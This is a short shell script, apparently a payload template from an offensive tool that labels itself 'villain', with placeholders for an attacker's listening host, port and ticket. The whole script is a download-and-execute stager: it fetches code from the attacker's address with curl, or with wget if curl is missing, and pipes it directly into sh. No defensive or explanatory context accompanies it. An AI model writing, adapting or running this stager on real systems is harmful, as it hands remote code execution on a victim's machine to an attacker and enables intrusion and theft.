url='http://*LHOST*:*LPORT*/*TICKET*'
if command -v curl >/dev/null 2>&1; then
    curl -s "$url" | sh
elif command -v wget >/dev/null 2>&1; then
    wget -q -O - "$url" | sh
else
    echo "[villain] no curl/wget available" >&2
fi
